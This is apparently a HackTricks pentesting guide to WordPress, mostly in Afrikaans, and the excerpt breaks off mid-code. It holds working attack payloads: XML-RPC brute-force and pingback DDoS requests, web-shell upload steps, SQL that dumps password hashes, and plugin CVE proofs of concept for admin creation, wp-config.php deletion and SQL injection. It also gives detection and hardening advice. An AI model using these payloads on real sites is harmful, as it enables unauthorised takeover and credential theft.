# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Basiese Inligting

- **Uploaded** lêers gaan na: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** kan jy die root-wagwoord van die databasis vind.
- Standaard aanmeldpaaie om te kontroleer: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` bevat nuttige inligting soos die geïnstalleerde WordPress-weergawe.
- `wp-activate.php` word gebruik vir die e-pos-aktiveringsproses wanneer 'n nuwe WordPress-webwerf opgestel word.
- Aanmeld-mappes (kan hernoem wees om dit te verberg):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` is 'n lêer wat 'n funksie van WordPress verteenwoordig wat data toelaat om gestuur te word met HTTP as die transpor-meganisme en XML as die enkodering. Hierdie tipe kommunikasie is vervang deur die WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Die `wp-content` vouer is die hoofgids waar plugins and themes gestoor word.
- `wp-content/uploads/` is die gids waar enige lêers wat na die platform opgelaai is, gestoor word.
- `wp-includes/` dit is die gids waar kernlêers gestoor word, soos sertifikate, fonts, JavaScript-lêers, en widgets.
- `wp-sitemap.xml` In Wordpress weergawes 5.5 en later, genereer Worpress 'n sitemap XML-lêer met alle openbare plasings en publiek navraagbare posttipes en taksonomieë.

**Post exploitation**

- Die `wp-config.php` lêer bevat inligting wat benodig word deur WordPress om aan die databasis te koppel soos die databasisnaam, databasis-host, gebruikersnaam en wagwoord, authentication keys and salts, en die databasis tabelvoorvoegsel. Hierdie konfigurasielêer kan ook gebruik word om DEBUG-modus te aktiveer, wat nuttig kan wees by foutopsporing.

### Gebruikerstoestemmings

- **Administrator**
- **Editor**: Publiseer en bestuur sy eie en ander se plasings
- **Author**: Publiseer en bestuur sy eie plasings
- **Contributor**: Skryf en bestuur sy plasings maar kan dit nie publiseer nie
- **Subscriber**: Blaai deur plasings en wysig hul profiel

## **Passiewe Enumerasie**

### **Get WordPress version**

Kontroleer of jy die lêers `/license.txt` of `/readme.html` kan vind

Binne die **bronkode** van die blad (voorbeeld vanaf [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link-lêers

![](<../../images/image (533).png>)

- JavaScript-lêers

![](<../../images/image (524).png>)

### Kry Plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Kry temas
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Uittrek van weergawes in die algemeen
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktiewe enumerasie

### Inproppe en temas

Jy sal waarskynlik nie alle inproppe en temas kan vind nie. Om al hulle te ontdek, sal jy nodig hê om **aktyf 'n lys van inproppe en temas te Brute Force** (hopelik is daar geautomatiseerde tools wat hierdie lyste bevat).

### Gebruikers

- **ID Brute:** Jy kry geldige gebruikers van 'n WordPress-webwerf deur gebruikers-ID's te Brute Forcing:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
As die antwoorde **200** of **30X** is, beteken dit dat die id **geldig** is. As die antwoord **400** is, dan is die id **ongeldig**.

- **wp-json:** Jy kan ook probeer om inligting oor die gebruikers te kry deur navrae uit te voer:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Nog 'n `/wp-json/` endpoint wat sekere inligting oor gebruikers kan openbaar, is:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **Slegs inligting oor gebruikers wat hierdie funksie geaktiveer het, sal verskaf word**.

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: Wanneer daar aangemeld word by **`/wp-login.php`** is die **boodskap** **anders** en dui dit aan of die **gebruikersnaam bestaan of nie**.

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (Jy kan hierdie proses automatiseer[ using this](https://github.com/relarizky/wpxploit) byvoorbeeld).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**Kontroleer**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** of **`metaWeblog.getUsersBlogs`** is 'n paar metodes wat gebruik kan word om credentials te brute-force. As jy enige van hulle kan vind, kan jy iets soos die volgende stuur:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Die boodskap _"Incorrect username or password"_ binne 'n 200 code response moet verskyn as die credentials nie geldig is nie.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Met die korrekte credentials kan jy 'n lêer upload. In die response sal die path verskyn ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Daar is ook 'n **sneller manier** om brute-force credentials te doen deur **`system.multicall`** te gebruik, aangesien jy verskeie credentials in dieselfde versoek kan probeer:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Hierdie metode is bedoel vir programme en nie vir mense nie, en is oud; daarom ondersteun dit nie 2FA nie. Dus, as jy geldige creds het maar die hooftoegang beskerm word deur 2FA, **mag jy dalk xmlrpc.php kan misbruik om met daardie creds in te log en 2FA te omseil**. Let wel dat jy nie al die aksies kan uitvoer wat jy deur die console kan doen nie, maar jy mag steeds toegang tot RCE kry soos Ippsec dit verduidelik in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **thousands** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** a interne **network** te laat **scan** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

As jy **faultCode** kry met 'n waarde **groter** as **0** (17), beteken dit die poort is oop.

Kyk na die gebruik van **`system.multicall`** in die vorige afdeling om te leer hoe om hierdie metode te misbruik om DDoS te veroorsaak.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Hierdie lêer bestaan gewoonlik onder die root van die Wordpress-site: **`/wp-cron.php`**\
Wanneer hierdie lêer **accessed** word, word 'n "**heavy**" MySQL **query** uitgevoer, so dit kan deur **attackers** gebruik word om 'n **DoS** te **cause**.\
Boonop, standaard word `wp-cron.php` op elke bladsylaai aangeroep (elke keer as 'n client enige Wordpress-bladsy versoek), wat op hoë-verkeersites probleme kan veroorsaak (DoS).

Dit word aanbeveel om Wp-Cron te deaktiveer en 'n werklike cronjob op die host te skep wat die nodige aksies op 'n gereelde interval uitvoer (sonder om probleme te veroorsaak).

### /wp-json/oembed/1.0/proxy - SSRF

Probeer om _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ te besoek en die Worpress-site mag 'n versoek aan jou maak.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Hierdie tool kontroleer of die **methodName: pingback.ping** en die pad **/wp-json/oembed/1.0/proxy** bestaan; as dit bestaan probeer dit om hulle te exploit.

## Outomatiese gereedskap
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Kry toegang deur 'n bit te oorskryf

Meer as 'n regte aanval is dit 'n nuuskierigheid. In die CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) kon jy flip 1 bit van enige wordpress-lêer. Dus kon jy die posisie `5389` van die lêer `/var/www/html/wp-includes/user.php` flip om die NOT (`!`) operasie te NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Paneel RCE**

**Wysig 'n php uit die gebruikte tema (administrateur-aanmeldbewyse benodig)**

Voorkoms → Tema-redigeerder → 404-sjabloon (aan die regterkant)

Verander die inhoud na 'n php shell:

![](<../../images/image (384).png>)

Soek op die internet hoe jy daardie opgedateerde bladsy kan bereik. In hierdie geval moet jy hierdie adres besoek: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Jy kan gebruik:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
om 'n sessie te kry.

## Plugin RCE

### PHP plugin

Dit mag moontlik wees om .php-lêers as 'n plugin op te laai.\
Skep jou php backdoor byvoorbeeld soos:

![](<../../images/image (183).png>)

Voeg dan 'n nuwe plugin by:

![](<../../images/image (722).png>)

Laai die plugin op en druk Install Now:

![](<../../images/image (249).png>)

Klik op Procced:

![](<../../images/image (70).png>)

Waarskynlik sal dit skynbaar niks doen nie, maar as jy na Media gaan, sal jy jou shell sien opgelaai:

![](<../../images/image (462).png>)

Toegang daartoe en jy sal die URL sien om die reverse shell uit te voer:

![](<../../images/image (1006).png>)

### Oplaai en aktivering van 'n kwaadaardige plugin

Hierdie metode behels die installering van 'n kwaadaardige plugin wat bekend is as kwesbaar en wat uitgebuit kan word om 'n web shell te kry. Hierdie proses word via die WordPress dashboard uitgevoer soos volg:

1. **Verkryging van plugin**: Die plugin word verkry vanaf 'n bron soos Exploit DB, byvoorbeeld [**here**](https://www.exploit-db.com/exploits/36374).
2. **Installering van plugin**:
- Navigeer na die WordPress dashboard, dan na `Dashboard > Plugins > Upload Plugin`.
- Laai die zip-lêer van die afgelaaide plugin op.
3. **Aktivering van plugin**: Sodra die plugin suksesvol geïnstalleer is, moet dit deur die dashboard geaktiveer word.
4. **Eksploitering**:
- Met die plugin "reflex-gallery" geïnstalleer en geaktiveer, kan dit uitgebuit word aangesien dit bekend is as kwesbaar.
- Die Metasploit framework voorsien 'n exploit vir hierdie kwesbaarheid. Deur die toepaslike module te laai en spesifieke opdragte uit te voer, kan 'n meterpreter-sessie gevestig word, wat ongemagtigde toegang tot die webwerf gee.
- Daar word opgemerk dat dit net een van die vele metodes is om 'n WordPress-webwerf uit te buit.

Die inhoud sluit visuele hulpmiddels in wat die stappe in die WordPress dashboard uitbeeld vir die installering en aktivering van die plugin. Dit is egter belangrik om op te merk dat die uitbuiting van kwesbaarhede op hierdie wyse onwettig en oneties is sonder behoorlike magtiging. Hierdie inligting moet verantwoordelik gebruik word en slegs in 'n wettige konteks, soos penetration testing met uitdruklike toestemming.

**Vir meer gedetailleerde stappe kyk:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Van XSS na RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is 'n script ontwerp om 'n **Cross-Site Scripting (XSS)**-kwesbaarheid op te gradeer na **Remote Code Execution (RCE)** of ander kritieke kwesbaarhede in WordPress. Vir meer inligting sien [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Dit bied **ondersteuning vir WordPress weergawes 6.X.X, 5.X.X en 4.X.X en laat toe om:**
- _**Privilege Escalation:**_ Skep 'n gebruiker in WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Laai jou custom plugin (backdoor) na WordPress op.
- _**(RCE) Built-In Plugin Edit:**_ Wysig 'n ingeboude plugin in WordPress.
- _**(RCE) Built-In Theme Edit:**_ Wysig 'n ingeboude tema in WordPress.
- _**(Custom) Custom Exploits:**_ Custom exploits vir derdeparty WordPress-plugins/temas.

## Post Exploitation

Onttrek gebruikersname en wagwoorde:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Verander admin-wagwoord:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Aanvalsoppervlak

Om te verstaan hoe 'n Wordpress plugin funksionaliteit kan blootstel, is noodsaaklik om kwesbaarhede in daardie funksionaliteit te vind. Jy kan sien hoe 'n plugin funksionaliteit kan blootstel in die volgende punte en 'n paar voorbeelde van kwesbare plugins in [**hierdie blogpos**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Een van die maniere waarop 'n plugin funksies aan gebruikers kan blootstel, is via AJAX handlers. Hierdie kan logiese, authorization- of authentication-bugs bevat. Verder is dit gereeld dat hierdie funksies beide authentication en authorization baseer op die bestaan van 'n Wordpress nonce wat **enige gebruiker wat in die Wordpress-instansie geauthentikeer is, kan hê** (onafhanklik van sy rol).

Dit is die funksies wat gebruik kan word om 'n funksie in 'n plugin bloot te stel:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Die gebruik van `nopriv` maak die endpoint deur alle gebruikers toeganklik (selfs ongeauthentiseerde gebruikers).**

> [!CAUTION]
> Verder, as die funksie net die outorisering van die gebruiker nagaan met die funksie `wp_verify_nonce`, kontroleer hierdie funksie net of die gebruiker aangemeld is; dit kontroleer gewoonlik nie die rol van die gebruiker nie. Dus kan gebruikers met lae bevoegdhede toegang hê tot aksies met hoë bevoegdhede.

- **REST API**

Dit is ook moontlik om funksies van wordpress bloot te stel deur 'n rest AP te registreer met die funksie `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
Die `permission_callback` is 'n callback-funksie wat kontroleer of 'n gegewe gebruiker gemagtig is om die API-metode aan te roep.

**As die ingeboude `__return_true` funksie gebruik word, sal dit eenvoudig die gebruikers se toestemmingskontrole oorskiet.**

- **Direct access to the php file**

Natuurlik gebruik Wordpress PHP en lêers binne plugins is direk via die web toeganklik. Dus, as 'n plugin enige kwesbare funksionaliteit blootstel wat net deur toegang tot die lêer geaktiveer word, sal dit deur enige gebruiker uitgebuit kan word.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Sommige plugins implementeer "trusted header" kortpaaie vir interne integrasies of reverse proxies en gebruik daardie header dan om die huidige gebruiker-konteks vir REST-versoeke te stel. As die header nie kriptografies aan die versoek gebind is deur 'n upstream-komponent nie, kan 'n aanvaller dit spoof en bevoorregte REST-roetes as 'n administrateur teiken.

- Impact: Onautentiseerde privilege-opskaling na admin deur 'n nuwe administrateur te skep via die core users REST-route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (dwing gebruiker-ID 1 af, tipies die eerste administrateurrekening).
- Exploited route: `POST /wp-json/wp/v2/users` met 'n verhoogde role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Waarom dit werk

- Die plugin map `client-controlled` header na authentication state en slaan capability checks oor.
- WordPress core verwag `create_users` capability vir hierdie route; die plugin hack omseil dit deur direk die current user context vanaf die header te stel.

Verwagte suksesaanwysers

- HTTP 201 met 'n JSON body wat die geskepte gebruiker beskryf.
- 'n Nuwe admin gebruiker sigbaar in `wp-admin/users.php`.

Opsporingskontrolelys

- Grep vir `getallheaders()`, `$_SERVER['HTTP_...']`, of vendor SDKs wat custom headers lees om user context te stel (bv. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Hersien REST registrasies vir bevoorregte callbacks wat geen robuuste `permission_callback` checks het nie en eerder op request headers staatmaak.
- Kyk vir gebruik van core user-management funksies (`wp_insert_user`, `wp_create_user`) binne REST handlers wat slegs deur header values geblokkeer word.

### Ongeauthentiseerde arbitraire lêerverwydering via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes en plugins openbaar dikwels AJAX handlers deur die `wp_ajax_` en `wp_ajax_nopriv_` hooks. Wanneer die **_nopriv_** variant gebruik word **word die callback deur ongeauthentiseerde besoekers bereikbaar**, dus moet enige sensitiewe aksie ook die volgende implementeer:

1. 'n **capability check** (bv. `current_user_can()` of ten minste `is_user_logged_in()`), en
2. 'n **CSRF nonce** gevalideer met `check_ajax_referer()` / `wp_verify_nonce()`, en
3. **Streng invoersanitisasie / validering**.

Die Litho multipurpose theme (< 3.1) het daardie 3 kontroles in die *Remove Font Family* funksie vergeet en het uiteindelik die volgende kode (vereenvoudig) gelewer:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **Ongeauthentiseerde toegang** – die `wp_ajax_nopriv_` hook is registered.
* **Geen nonce / capability check** – enige besoeker kan die endpoint aanroep.
* **Geen pad-sanitisering** – die user–controlled `fontfamily` string word aan 'n filesystem path gekoppel sonder filtering, wat klassieke `../../` traversal toelaat.

#### Uitbuiting

'n Aanvaller kan enige lêer of gids **onder die uploads base directory** (gewoonlik `<wp-root>/wp-content/uploads/`) verwyder deur 'n enkele HTTP POST versoek te stuur:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Omdat `wp-config.php` buite *uploads* lê, is vier `../`-reekse genoeg op 'n standaardinstallasie. Om `wp-config.php` te verwyder dwing WordPress by die volgende besoek die *installasiewizard* om te begin, wat 'n volledige oorneem van die site moontlik maak (die aanvaller verskaf eenvoudig 'n nuwe DB-konfigurasie en skep 'n admin-gebruiker).

Ander impakvolle teikens sluit in plugin/theme `.php` lêers (om sekuriteits-plugins te breek) of `.htaccess` reëls.

#### Detection checklist

* Enige `add_action( 'wp_ajax_nopriv_...')` callback wat filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.) aanroep.
* Koppeling van nie-gesaniteerde gebruikersinvoer in paadjies (kyk vir `$_POST`, `$_GET`, `$_REQUEST`).
* Afwesigheid van `check_ajax_referer()` en `current_user_can()`/`is_user_logged_in()`.

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Baie plugins implementeer 'n "view as role" of tydelike rol-wissel funksie deur die oorspronklike rol(le) in user meta te stoor sodat dit later herstel kan word. As die herstelpad slegs op versoekparameters berus (bv., `$_REQUEST['reset-for']`) en 'n plugin-onderhoude lys sonder om capabilities en 'n geldige nonce te kontroleer, word dit 'n vertical privilege escalation.

'n Werklike voorbeeld is gevind in die Admin and Site Enhancements (ASE) plugin (≤ 7.6.2.1). Die reset-branch het rolle herstel gebaseer op `reset-for=<username>` as die gebruikersnaam in 'n interne array `$options['viewing_admin_as_role_are']` verskyn het, maar het nie 'n `current_user_can()`-kontrole of nonce-verifikasie uitgevoer nie voordat huidige rolle verwyder en die gestoor rolle vanuit user meta `_asenha_view_admin_as_original_roles` weer bygevoeg is:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Waarom dit uitbuitbaar is

- Vertrou op `$_REQUEST['reset-for']` en 'n plugin-opsie sonder server-side toestemming.
- As 'n gebruiker voorheen hoër voorregte gehad het wat gestoor is in `_asenha_view_admin_as_original_roles` en afgradeer is, kan hulle dit herstel deur die terugstelpad te besoek.
- In sommige implementasies kon enige geauthentiseerde gebruiker 'n reset vir 'n ander gebruikersnaam wat steeds in `viewing_admin_as_role_are` teenwoordig is, aktiveer (gebreekte magtiging).

Uitbuiting (voorbeeld)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Op kwesbare builds verwyder dit die huidige rolle en voeg die gestoorde oorspronklike rolle weer by (e.g., `administrator`), effectively escalating privileges.

Detection checklist

- Kyk vir role-switching features wat die “original roles” in user meta bewaar (e.g., `_asenha_view_admin_as_original_roles`).
- Identifiseer reset/restore paths wat:
- Lees gebruikersname vanaf `$_REQUEST` / `$_GET` / `$_POST`.
- Wysig rolle via `add_role()` / `remove_role()` sonder `current_user_can()` en `wp_verify_nonce()` / `check_admin_referer()`.
- Magtig op grond van 'n plugin option array (e.g., `viewing_admin_as_role_are`) in plaas van die akteur se capabilities.

---

### Unauthenticated privilege escalation via cookie‑trusted user switching on public init (Service Finder “sf-booking”)

Some plugins wire user-switching helpers to the public `init` hook and derive identity from a client-controlled cookie. If the code calls `wp_set_auth_cookie()` without verifying authentication, capability and a valid nonce, any unauthenticated visitor can force login as an arbitrary user ID.

Typical vulnerable pattern (simplified from Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Waarom dit uitbuitbaar is

- Publieke `init` hook maak die hanteraar bereikbaar vir ongeauthentiseerde gebruikers (geen `is_user_logged_in()`-kontrole).
- Identiteit word afgelei van 'n deur die kliënt wysigbare cookie (`original_user_id`).
- Direkte oproep na `wp_set_auth_cookie($uid)` teken die versoeker aan as daardie gebruiker sonder enige bevoegdheids-/nonce-kontroles.

Eksploitasie (ongeauthentiseerd)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF-oorwegings vir WordPress/plugin CVEs

Generiese edge/server WAFs is afgestel op breë patrone (SQLi, XSS, LFI). Baie hoë‑impak WordPress/plugin foute is toepassingsspesifieke logika/auth-bugs wat soos onskadelike verkeer lyk tensy die engine WordPress-roetes en plugin-semantiek verstaan.

Aanvalsnotas

- Teiken plugin-spesifieke endpoints met skoon payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Gebruik eers ongeauthentiseerde paaie (AJAX `nopriv`, REST met permissiewe `permission_callback`, openbare shortcodes). Standaard-payloads slaag dikwels sonder obfuskasie.
- Tipiese hoë‑impak gevalle: privilege escalation (gebroke toegangsbeheer), arbitêre lêer oplaai/aflaai, LFI, open redirect.

Verdedigingsnotas

- Moenie staatmaak op generiese WAF-handtekeninge om plugin CVEs te beskerm nie. Implementeer aansoeklaag- en kwesbaarheidspesifieke virtuele pleisters of werk vinnig op.
- Gee voorkeur aan positiewe-sekuriteitskontroles in kode (capabilities, nonces, streng invoervalidasie) bo negatiewe regex-filters.

## WordPress Beskerming

### Gereelde opdaterings

Maak seker WordPress, plugins en themes is op datum. Bevestig ook dat geoutomatiseerde opdatering in wp-config.php aangeskakel is:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Also, **only install trustable WordPress plugins and themes**.

### Security Plugins

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Other Recommendations**

- Verwyder die standaard **admin** gebruiker
- Gebruik **sterk wagwoorde** en **2FA**
- Hersien gereeld gebruikers se **toestemmings**
- Beperk aanmeldpogings om Brute Force-aanvalle te voorkom
- Hernoem die **`wp-admin.php`** lêer en laat slegs toegang intern of vanaf sekere IP-adresse toe.


### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

Die WP Job Portal recruitment-plugin het 'n **savecategory** taak ontsluit wat uiteindelik die volgende kwesbare kode binne `modules/category/model.php::validateFormData()` uitvoer:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Nie-gefiltreerde gebruikerinvoer** – `parentid` kom direk uit die HTTP-versoek.
2. **String-konkatenasie binne die WHERE-klousule** – geen `is_numeric()` / `esc_sql()` / prepared statement.
3. **Ongeauthentiseerde bereikbaarheid** – alhoewel die aksie uitgevoer word deur `admin-post.php`, is die enigste kontrole in plek 'n **CSRF nonce** (`wp_verify_nonce()`), wat enige besoeker vanaf 'n publieke bladsy wat die shortcode `[wpjobportal_my_resumes]` insluit, kan bekom.

#### Exploitation

1. Kry 'n vars nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Inject arbitrary SQL deur `parentid` te misbruik:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Die response openbaar die resultaat van die ingespuite query of verander die databasis, wat SQLi bewys.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Nog 'n taak, **downloadcustomfile**, het besoekers toegelaat om **enige lêer op skyf** af te laai via path traversal. Die kwetsbare sink is geleë in `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
